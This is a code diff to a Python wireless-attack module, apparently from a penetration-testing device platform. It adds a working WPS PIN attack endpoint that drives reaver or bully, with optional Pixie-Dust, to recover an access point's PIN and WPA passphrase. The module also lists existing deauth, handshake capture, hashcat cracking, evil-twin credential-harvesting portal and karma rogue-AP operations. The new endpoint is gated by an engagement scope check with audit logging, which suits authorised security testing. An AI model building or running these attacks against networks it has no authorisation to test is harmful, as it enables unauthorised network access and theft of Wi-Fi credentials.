@@ -26,6 +26,9 @@ Operations implemented in this module:
                                        redirect + "firmware update" captive portal
                                        (creds -> engagements/<uuid>/)
   POST /api/wifi_offensive/karma       airbase-ng -P respond-to-all-probes (MANA)
+  POST /api/wifi_offensive/wps         reaver | bully WPS PIN attack (optional
+                                       Pixie-Dust) vs an in-scope AP -> recovered
+                                       PIN + WPA passphrase land in the job output
 
 Rogue-AP ops drive ``wlan1`` through monitor mode (``mon0``) just like the
 injection ops: ``_submit_gated`` flips the radio to monitor via the MT7921
@@ -40,8 +43,8 @@ SSID a client probes for) so there is no single target — it gates on
 engagement-mode-active ONLY (``target=""`` -> refuse when OFF, audit every
 start) and never bypasses the engagement gate.
 
-Deferred (clear TODO stubs, return HTTP 501): WPS (reaver/bully),
-WPA-Enterprise harvester (eaphammer).
+Deferred (clear TODO stub, returns HTTP 501): WPA-Enterprise harvester
+(eaphammer — not installed on the device).
 See ``02-warlock-command-center.md`` (Module 6) for the full spec.
 """
 from __future__ import annotations
@@ -74,6 +77,11 @@ AIRODUMP = shutil.which("airodump-ng") or "/usr/sbin/airodump-ng"
 HCXDUMPTOOL = shutil.which("hcxdumptool") or "/usr/bin/hcxdumptool"
 HCXPCAPNGTOOL = shutil.which("hcxpcapngtool") or "/usr/bin/hcxpcapngtool"
 HASHCAT = shutil.which("hashcat") or "/usr/bin/hashcat"
+# WPS PIN-attack tools (gated /wps op). reaver brute-forces / Pixie-Dusts the WPS
+# PIN and derives the WPA passphrase; bully is the alternate engine. Both need
+# the mon0 monitor iface + root.
+REAVER = shutil.which("reaver") or "/usr/bin/reaver"
+BULLY = shutil.which("bully") or "/usr/bin/bully"
 # Rogue-AP stack (gated evil-twin / karma). airbase-ng (aircrack-ng) drives the
 # monitor iface and exposes a tap; dnsmasq serves DHCP + the captive-portal DNS
 # catch-all on that tap. (hostapd-mana was the original plan but is not cleanly
@@ -167,6 +175,19 @@ def _ap_tools_missing() -> list[str]:
     if not (shutil.which("dnsmasq") or Path(DNSMASQ).exists()):
         missing.append("dnsmasq")
     return missing
+
+
+WPS_TOOLS = ("reaver", "bully")
+
+
+def _wps_tool_missing(tool: str) -> bool:
+    """True if the selected WPS tool (reaver|bully) is not installed.
+
+    Probed only inside the ``_would_allow`` branch of the /wps handler so tool
+    state never leaks to an unauthorised caller (mirrors ``_ap_tools_missing``).
+    """
+    path = REAVER if tool == "reaver" else BULLY
+    return not (shutil.which(tool) or Path(path).exists())
 
 
 def _contained(path: Path, root: Path) -> bool:
@@ -397,6 +418,46 @@ def _crack_command(
         argv += ["--potfile-path", str(potfile)]
     if outfile is not None:
         argv += ["-o", str(outfile)]
+    return argv
+
+
+def _wps_command(
+    *, tool: str, bssid: str, channel: int, pixie_dust: bool = False,
+    duration: int = 600, iface: str = MON_IFACE,
+) -> list[str]:
+    """Build the WPS PIN-attack invocation (reaver OR bully).
+
+    Both need root (raw monitor-mode sockets) and are wrapped in ``timeout`` so a
+    PIN brute-force can never run unbounded — identical to how ``_pmkid_command``
+    bounds its capture. The recovered WPS PIN and derived WPA passphrase are
+    printed to stdout/stderr, which the job runner persists, so the result is
+    surfaced via /jobs + /status (no separate capture artifact).
+
+    The BSSID and channel flow into the argv as discrete tokens (NOT a shell
+    string) and ``runner.submit`` execs the list directly, so there is no shell
+    to escape; the BSSID is already validated by ``_norm_mac`` and the channel is
+    int-coerced.
+
+      reaver: timeout <dur> sudo -n reaver -i mon0 -b <bssid> -c <chan> -vv [-K 1]
+      bully:  timeout <dur> sudo -n bully  mon0 -b <bssid> -c <chan>      [-d]
+
+    Pixie-Dust (offline WPS attack) is ``-K 1`` for reaver and ``-d``
+    (``--pixiewps``) for bully.
+    """
+    duration = max(30, int(duration))
+    channel = int(channel)
+    tool = (tool or "").strip().lower()
+    if tool not in WPS_TOOLS:
+        raise HTTPException(400, f"unsupported wps tool {tool!r}; choose {sorted(WPS_TOOLS)}")
+    prefix = ["timeout", str(duration), "sudo", "-n"]
+    if tool == "reaver":
+        argv = prefix + [REAVER, "-i", iface, "-b", bssid, "-c", str(channel), "-vv"]
+        if pixie_dust:
+            argv += ["-K", "1"]
+    else:  # bully — interface is a positional argument
+        argv = prefix + [BULLY, iface, "-b", bssid, "-c", str(channel)]
+        if pixie_dust:
+            argv.append("-d")
     return argv
 
 
@@ -733,6 +794,16 @@ class KarmaBody(BaseModel):
     duration: int = Field(default=900, ge=30, le=86_400, description="AP lifetime seconds")
 
 
+class WpsBody(BaseModel):
+    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
+    channel: int = Field(..., ge=1, le=196, description="AP channel")
+    tool: str = Field(default="reaver", description="WPS attack engine: reaver or bully")
+    pixie_dust: bool = Field(default=False, description="Pixie-Dust offline WPS attack (-K 1 / -d)")
+    # Time budget for the PIN attack. Pixie-Dust finishes in seconds; a full PIN
+    # brute can take hours, so callers SHOULD raise this for non-pixie runs.
+    duration: int = Field(default=600, ge=30, le=86_400, description="Attack time budget seconds")
+
+
 # --------------------------------------------------------------------------- #
 # Rogue-AP launch path (shared by evil-twin + karma). Goes through the exact
 # same engagement gate as every other op via _submit_gated:
@@ -816,7 +887,7 @@ class Module(ModuleBase):
                 "engaged": engagement.is_on(),
                 "engagement": engagement.status(),
                 "iface": {"managed": WLAN_IFACE, "monitor": MON_IFACE},
-                "ops": ["deauth", "pmkid", "handshake", "crack", "evil_twin", "karma"],
+                "ops": ["deauth", "pmkid", "handshake", "crack", "evil_twin", "karma", "wps"],
                 "deferred": TODO_ITEMS,
                 "captures": _list_captures(),
                 "wordlists": _list_wordlists(),
@@ -946,16 +1017,45 @@ class Module(ModuleBase):
                 karma=True, portal=False,
             )
 
-        # ----- Deferred ops: clear 501 stubs (still engagement-gated module) #
-        # TODO(wave-3+): implement these. When built they MUST route through
-        # ``_submit_gated`` exactly like the ops above so the engagement gate +
-        # audit trail apply uniformly.
-        #   - WPS attacks (reaver / bully)
-        #   - WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)
+        # ----- Op 7: WPS PIN attack (reaver / bully) ----------------------- #
+        # Targets a single in-scope AP's WPS PIN, so it keeps the full scope gate
+        # (target=<bssid>) exactly like deauth/handshake — routed through
+        # _submit_gated, so engagement-off / out-of-scope both refuse 403 + log a
+        # scope.violation, and every accepted run is audited.
         @r.post("/wps")
-        def wps() -> dict[str, Any]:
-            raise HTTPException(501, "WPS (reaver/bully) not implemented in MVP (deferred)")
+        async def wps(body: WpsBody) -> dict[str, Any]:
+            bssid = _norm_mac(body.bssid, "bssid")  # validate BSSID BEFORE the gate
+            tool = (body.tool or "").strip().lower()
+            if tool not in WPS_TOOLS:
+                raise HTTPException(
+                    400, f"unsupported wps tool {body.tool!r}; choose {sorted(WPS_TOOLS)}"
+                )
+            # Only probe tool presence for an op the gate would allow, so tool
+            # state never leaks to an unauthorised caller (mirrors the rogue-AP
+            # 503 path). _submit_gated stays the authoritative gate below.
+            if _would_allow(bssid) and _wps_tool_missing(tool):
+                raise HTTPException(503, f"required WPS tool not installed: {tool}")
+            argv = _wps_command(
+                tool=tool, bssid=bssid, channel=body.channel,
+                pixie_dust=body.pixie_dust, duration=body.duration,
+            )
+            job_id = await _submit_gated(
+                "wifi.wps", argv, target=bssid,
+                note=(
+                    f"wps {tool} ap={bssid} ch={body.channel} "
+                    f"pixie_dust={body.pixie_dust} dur={body.duration}s"
+                ),
+            )
+            return {
+                "ok": True, "op": "wps", "job_id": job_id, "target": bssid,
+                "tool": tool, "pixie_dust": body.pixie_dust, "argv": argv,
+            }
 
+        # ----- Deferred op: clear 501 stub (still engagement-gated module) -- #
+        # TODO(wave-3+): implement the WPA-Enterprise harvester. When built it
+        # MUST route through ``_submit_gated`` exactly like the ops above so the
+        # engagement gate + audit trail apply uniformly.
+        #   - WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)
         @r.post("/eaphammer")
         def eaphammer() -> dict[str, Any]:
             raise HTTPException(501, "WPA-Enterprise harvester (eaphammer) not implemented in MVP (deferred)")
@@ -964,7 +1064,6 @@ class Module(ModuleBase):
 
 
 TODO_ITEMS: list[str] = [
-    "WPS attacks (reaver / bully)",
     "WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)",
     "Auto-enqueue crack on capture completion (job-completion wiring)",
 ]
